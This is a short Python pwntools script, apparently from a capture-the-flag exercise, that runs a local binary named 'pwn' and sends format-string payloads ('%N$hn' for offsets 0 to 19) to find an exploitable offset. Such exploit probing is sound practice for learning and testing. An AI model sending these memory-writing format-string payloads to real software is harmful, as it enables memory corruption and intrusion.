from pwn import *
elf = context.binary = ELF('./pwn', checksec=False)
for i in range(20):
    try:
        p = elf.process()
        p.sendlineafter(b'>>', b'%' + str(i).encode() + b'$hn')
        result = p.recvlines(3)
        print(str(i) + ': ' + str(result))
        print("success")
        p.close()
    except EOFError:
        print("error")
        pass